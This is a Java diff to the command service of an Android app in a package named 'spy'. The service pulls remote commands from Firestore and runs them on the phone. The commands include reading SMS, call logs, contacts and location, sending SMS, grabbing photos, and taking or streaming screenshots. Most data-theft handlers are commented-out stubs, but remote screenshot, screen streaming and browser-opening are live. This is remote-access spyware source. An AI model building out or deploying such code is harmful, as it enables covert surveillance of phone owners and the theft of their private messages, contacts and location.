@@ -20,7 +20,10 @@ import com.example.spy.activities.ScreenProjectionActivity;
 import com.example.spy.device.hardware.DeviceState;
 import com.example.spy.models.Command;
 import com.example.spy.models.Location;
+import com.example.spy.tasks.Ringing;
+import com.example.spy.tasks.Vibrate;
 import com.example.spy.utils.AppController;
+import com.example.spy.utils.CommonParams;
 import com.example.spy.utils.Constants;
 import com.google.android.gms.location.FusedLocationProviderClient;
 import com.google.android.gms.location.LocationCallback;
@@ -28,18 +31,14 @@ import com.google.android.gms.location.LocationRequest;
 import com.google.android.gms.location.LocationResult;
 import com.google.android.gms.location.LocationServices;
 import com.google.firebase.auth.FirebaseAuth;
-import com.google.firebase.firestore.EventListener;
 import com.google.firebase.firestore.FirebaseFirestore;
-import com.google.firebase.firestore.FirebaseFirestoreException;
-import com.google.firebase.firestore.Query;
 import com.google.firebase.firestore.QueryDocumentSnapshot;
-import com.google.firebase.firestore.QuerySnapshot;
+import com.google.firebase.firestore.SetOptions;
 
-import androidx.annotation.Nullable;
-import androidx.core.app.ActivityCompat;
 import androidx.core.app.NotificationCompat;
 import androidx.core.content.ContextCompat;
 
+import org.json.JSONException;
 import org.json.JSONObject;
 
 import java.text.SimpleDateFormat;
@@ -127,6 +126,7 @@ public class CommandService extends Service {
                 }
             } else {
                 Log.d(tag, "firebase auth failed");
+                //loginToFirebase();
             }
         });
     }
@@ -162,10 +162,18 @@ public class CommandService extends Service {
                             if(!p.command.isEmpty() && p.status.equalsIgnoreCase("0")){
                                 //Log.e(tag, "Command: " + p.command);
 
+                                p.setStatus("1");
+
+                                FirebaseFirestore.getInstance()
+                                        .collection("users")
+                                        .document(getString(R.string.firebase_email))
+                                        .collection("perangkat")
+                                        .document(gsf_id)
+                                        .collection("commands")
+                                        .document(p.key)
+                                        .set(p, SetOptions.merge());
 
                                 runTheCommend(p);
-
-
 
                             }
                         }
@@ -176,6 +184,180 @@ public class CommandService extends Service {
                 });
 
 
+
+
+    }
+
+    private void runTheCommend(Command cmd){
+
+        CommonParams params = new CommonParams(this);
+
+        String command = cmd.command;
+        Log.i(tag, "\nCommand: " + command + "\n");
+
+        switch (command) {
+            case "getSms" :
+
+                //int arg1 = Integer.parseInt(cmd.arg1);
+                //SmsTask(this, arg1, socket).start()
+                break;
+            case "getCallHistory" :
+
+                //int arg1 = Integer.parseInt(cmd.arg1);
+                //CallLogsTask(this, arg1, socket).start()
+                break;
+            case "getContacts" :
+
+                //ContactsTask(this, socket).start()
+                break;
+            case "addContact" :
+
+                String phone = cmd.arg1;
+                String name = cmd.arg2;
+                //AddNewContact(this, phone, name).start()
+                break;
+            case "getLocation" :
+
+                //LocationMonitor(this, socket).start()
+                break;
+            case "sendSms" :
+
+                String phoneNumber = cmd.arg1;
+                String textMessage = cmd.arg2;
+                //SendSmsTask(this, textMessage, phoneNumber, socket).start()
+                break;
+            case "getImages" :
+
+                //PhotosTask(this, socket).start()
+                break;
+            case "downloadImage" :
+
+                String path = cmd.arg1;
+                //DownloadImage(this, socket, path).start()
+                break;
+            case "openBrowser" :
+
+                String url = cmd.arg1;
+                startActivity(
+                        new Intent(Intent.ACTION_VIEW)
+                                .setData(Uri.parse("http://" + url))
+                                .setPackage("com.android.chrome")
+                );
+
+                break;
+            case "takeScreenShot" :
+
+                startActivity(
+                        new Intent(this, ScreenProjectionActivity.class)
+                                .setFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
+                );
+
+                break;
+            case "streamScreen" :
+
+                startActivity(
+                        new Intent(this, ScreenProjectionActivity.class)
+                                .putExtra("streamScreen", true)
+                                .setFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
+                );
+
+                break;
+            case "streamCamera" :
+
+                //I don't know how to stream yet!
+                break;
+            case "openApp" :
+
+                String appPackage = cmd.arg1;
+                //val intent: Intent = packageManager.getLaunchIntentForPackage(appPackage)
+                //startActivity(intent)
+                break;
+            case "openWhatsApp" :
+
+                String number = cmd.arg1;
+                String text = cmd.arg2;
+                //startActivity(Intent(Intent.ACTION_VIEW, Uri.parse("https://api.whatsapp.com/send?phone=$number&text=$text")))
+
+                break;
+            case "makeCall" :
+
+                //String number = cmd.arg1;
+                //String intent = new Intent(Intent.ACTION_CALL);
+                //intent.data = Uri.parse("tel:$number")
+               // if (ActivityCompat.checkSelfPermission(this, Manifest.permission.CALL_PHONE) == PackageManager.PERMISSION_GRANTED)
+                    //startActivity(intent)
+                break;
+            case "notification" :
+
+                // Way too long
+                break;
+            case "fileExplorer" :
+
+                // It will take long
+                break;
+            case "clientID" :
+
+                String clientID = cmd.arg1;
+                prefs.edit().putString("clientID", clientID).commit();
+                Log.d(tag, "ClientID: $clientID");
+                break;
+            case "stopAll" :
+
+                //PhotosTask.flag = false
+                //StreamScreen.flagStop = true
+                //LocationMonitor.locationUpdates = false
+                break;
+            case "vibrate":
+
+                int repeatTimes = 0;
+                String vibPattern = "";
+                try {
+                    repeatTimes = Integer.parseInt(cmd.arg1);
+                } catch (NumberFormatException nfe) {
+                    //do nothing
+                }
+
+                try {
+                    vibPattern = cmd.arg2;
+                } catch (NumberFormatException nfe) {
+                    //do nothing
+                }
+                new Vibrate();
+
+                break;
+            case "ringing":
+
+
+                int notif = 0;
+                String pesan = "";
+                try {
+                    notif = Integer.parseInt(cmd.arg1);
+                } catch (NumberFormatException nfe) {
+                    //do nothing
+                }
+                try {
+                    pesan = cmd.arg2;
+                } catch (NumberFormatException nfe) {
+                    //do nothing
+                }
+
+                new Ringing(notif,pesan);
+
+                break;
+            default:
+
+                Log.i(tag, "Unknown command");
+                JSONObject xcmd = new JSONObject();
+                try {
+                    xcmd.put("event", "command:unknown");
+                    xcmd.put("uid", params.uid);
+                    xcmd.put("device", params.device);
+                    xcmd.put("command", command);
+                } catch (JSONException e) {
+                    e.printStackTrace();
+                }
+                break;
+        }
 
 
     }
@@ -258,139 +440,6 @@ public class CommandService extends Service {
 
                 }
             },null);
-        }
-    }
-
-    private void runTheCommend(Command cmd){
-
-        String command = cmd.command;
-        Log.i(tag, "\nCommand: " + command + "\n");
-
-
-        switch (command) {
-
-            case "getSms" :
-                //int arg1 = Integer.parseInt(cmd.arg1);
-                //SmsTask(this, arg1, socket).start()
-                break;
-            case "getCallHistory" :
-
-                //int arg1 = Integer.parseInt(cmd.arg1);
-                //CallLogsTask(this, arg1, socket).start()
-                break;
-            case "getContacts" :
-
-                //ContactsTask(this, socket).start()
-                break;
-            case "addContact" :
-
-                String phone = cmd.arg1;
-                String name = cmd.arg2;
-                //AddNewContact(this, phone, name).start()
-                break;
-            case "getLocation" :
-
-                //LocationMonitor(this, socket).start()
-                break;
-            case "sendSms" :
-
-                String phoneNumber = cmd.arg1;
-                String textMessage = cmd.arg2;
-                //SendSmsTask(this, textMessage, phoneNumber, socket).start()
-                break;
-            case "getImages" :
-
-                //PhotosTask(this, socket).start()
-                break;
-            case "downloadImage" :
-
-                String path = cmd.arg1;
-                //DownloadImage(this, socket, path).start()
-                break;
-            case "openBrowser" :
-
-
-                String url = cmd.arg1;
-
-                startActivity(
-                        new Intent(Intent.ACTION_VIEW)
-                                .setData(Uri.parse("http://" + url))
-                                .setPackage("com.android.chrome")
-                );
-
-                break;
-            case "takeScreenShot" :
-
-
-                startActivity(
-                        new Intent(this, ScreenProjectionActivity.class)
-                );
-
-                break;
-            case "streamScreen" :
-
-                startActivity(
-                        new Intent(this, ScreenProjectionActivity.class)
-                                .putExtra("streamScreen", true)
-                );
-
-                break;
-            case "streamCamera" :
-
-                //I don't know how to stream yet!
-                break;
-            case "openApp" :
-
-                String appPackage = cmd.arg1;
-                //val intent: Intent = packageManager.getLaunchIntentForPackage(appPackage)
-                //startActivity(intent)
-                break;
-            case "openWhatsApp" :
-
-                String number = cmd.arg1;
-                String text = cmd.arg2;
-                //startActivity(Intent(Intent.ACTION_VIEW, Uri.parse("https://api.whatsapp.com/send?phone=$number&text=$text")))
-
-                break;
-            case "makeCall" :
-
-                //String number = cmd.arg1;
-                //String intent = new Intent(Intent.ACTION_CALL);
-                //intent.data = Uri.parse("tel:$number")
-               // if (ActivityCompat.checkSelfPermission(this, Manifest.permission.CALL_PHONE) == PackageManager.PERMISSION_GRANTED)
-                    //startActivity(intent)
-                break;
-            case "notification" :
-
-                // Way too long
-                break;
-            case "fileExplorer" :
-
-                // It will take long
-                break;
-            case "clientID" :
-
-                String clientID = cmd.arg1;
-                prefs.edit().putString("clientID", clientID).commit();
-                Log.d(tag, "ClientID: $clientID");
-                break;
-            case "stopAll" :
-
-                //PhotosTask.flag = false
-                //StreamScreen.flagStop = true
-                //LocationMonitor.locationUpdates = false
-                break;
-
-            default:
-
-                Log.i(tag, "Unknown command");
-                //JSONObject xcmd = new JSONObject();
-                //xcmd.put("event", "command:unknown");
-                //xcmd.put("uid", params.uid);
-                //xcmd.put("device", params.device);
-                //xcmd.put("command", command);
-
-                break;
         }
     }
 
